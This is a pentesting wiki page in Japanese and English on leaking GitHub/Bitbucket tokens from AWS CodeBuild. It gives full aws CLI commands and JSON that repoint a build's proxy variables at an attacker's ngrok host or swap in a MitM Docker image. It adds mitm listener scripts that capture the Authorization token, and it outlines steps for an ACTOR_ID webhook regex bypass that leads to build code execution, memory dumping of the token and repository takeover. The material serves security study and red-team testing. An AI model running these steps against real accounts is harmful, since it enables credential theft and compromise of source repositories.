# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recover Github/Bitbucket Configured Tokens

まず、leakできるようなソース認証情報が設定されていないか確認します:
```bash
aws codebuild list-source-credentials
```
### Docker Image 経由

もしアカウントに例えば Github への認証が設定されていることが判明した場合、Codebuild にプロジェクトのビルドを実行させる際に **use an specific docker image** を使わせることで、その **access**（**GH token or OAuth token**）を **exfiltrate** できます。

この目的のために、**create a new Codebuild project** するか、既存のものの **environment** を変更して **Docker image** を設定できます。

The Docker image you could use is [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). これは非常に基本的な Docker image で、**env variables `https_proxy`**, **`http_proxy`** および **`SSL_CERT_FILE`** を設定します。これにより **`https_proxy`** および **`http_proxy`** で指定されたホストのほとんどのトラフィックをインターセプトし、**`SSL_CERT_FILE`** で指定された SSL 証明書を信頼させることができます。

1. **Create & Upload your own Docker MitM image**
- リポジトリの指示に従い proxy IP アドレスと SSL 証明書を設定し、**build the docker image** します。
- **DO NOT SET `http_proxy`** — メタデータエンドポイントへのリクエストをインターセプトしないようにするためです。
- ホストをプロキシとして設定するために、**`ngrok`** を `ngrok tcp 4444` のように使うことができます。
- Docker image をビルドしたら、**upload it to a public repo** (Dockerhub, ECR...)。

2. **Set the environment**
- **Create a new Codebuild project** を作成するか、既存のプロジェクトの環境を **modify** します。
- プロジェクトが **previously generated Docker image** を使用するように設定します。

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- **Github repo** に記載されているように、次のようなものを使うことができます：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> 使用した **mitmproxy** のバージョンは 9.0.1 で、バージョン10では動作しない可能性が報告されています。

4. **ビルドを実行して資格情報を取得する**

- トークンは **Authorization** ヘッダーで確認できます:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

これは aws cli から次のように実行することもできます
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### insecureSSL 経由

**Codebuild** プロジェクトには **`insecureSsl`** という設定があり、ウェブ上では隠されていて API からしか変更できません。\
これを有効にすると、Codebuild はプラットフォームが提示する証明書を**検証せずに**リポジトリに接続できるようになります。

- まず、次のようなコマンドで現在の設定を列挙する必要があります:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- その後、収集した情報を用いてプロジェクト設定 **`insecureSsl`** を **`True`** に更新できます。以下は私がプロジェクトを更新した例で、末尾に **`insecureSsl=True`** があることに注意してください（これは収集した設定から変更する唯一の項目です）。
- さらに、環境変数 **http_proxy** と **https_proxy** を tcp ngrok を指すように追加してください:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- 次に、[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) の基本的な例を、プロキシ変数 (http_proxy と https_proxy) が指すポートで実行します。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- 最後に、**Build the project** をクリックすると、**credentials** が **平文（base64）で mitm ポートに送信されます**:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~HTTP プロトコル経由~~

> [!TIP] > **この脆弱性は 2023年2月20日の週のいずれかの時点で AWS により修正されました（多分金曜日だと思います）。そのため、攻撃者はもはやこれを悪用できません :)**

CodeBuild 上で権限が昇格した攻撃者は、設定されている Github/Bitbucket トークンを leak できるか、権限が OAuth 経由で構成されている場合は、コードにアクセスするために使用される一時的な OAuth トークンを leak する可能性があります。

- 攻撃者は環境変数 **http_proxy** と **https_proxy** を CodeBuild プロジェクトに追加し、自分のマシンを指すように設定できます（例えば `http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- 次に、github リポジトリの URL を HTTPS の代わりに HTTP を使うよう変更します。例えば: `http://github.com/carlospolop-forks/TestActions`
- その後、proxy 変数（http_proxy と https_proxy）が指すポートで、[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) の基本例を実行します。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- 次に、**Build the project** をクリックするか、コマンドラインからビルドを開始します:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Finally, the **credentials** will be **sent in clear text** (base64) to the mitm port:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> これにより攻撃者は自身のマシンからtokenを使用し、その権限を列挙して、CodeBuildサービスを直接使うよりも容易に悪用できるようになります。

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

Misconfigured CodeBuild GitHub webhooks that use unanchored `ACTOR_ID` regexes let *untrusted* PRs start privileged builds. If the allowlist is like `123456|7890123` without `^`/`$`, any ID containing one of those substrings matches. Because GitHub user IDs are sequential, an attacker can race to register an “eclipsing” ID (a superstring of a trusted ID) and trigger the build.

**エクスプロイトの手順**

1. 公開されている CodeBuild プロジェクトで webhook filters を公開しているものを見つけ、アンカーが付いていない `ACTOR_ID` allowlist を抽出する。
2. Obtain an eclipsing GitHub ID:
- GitHub org を作成/削除してグローバルIDカウンタをサンプリングする（org IDs は同じプールを共有する）。
- 多数の GitHub App manifest 作成を事前準備し、カウンタがターゲットに対して概ね~100 IDs 内になったときに確認用URLを一斉に実行して、信頼されたサブストリングを含むボットIDを短時間で登録する。
3. Open a PR from the eclipsing account; the regex matches the substring and the privileged build runs.
4. Use build RCE (e.g., dependency install hooks) to dump process memory handling the GitHub credential and recover the PAT/OAuth token.
5. With the token’s `repo` scope, invite your account as collaborator/admin and push/approve malicious commits or exfiltrate secrets.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
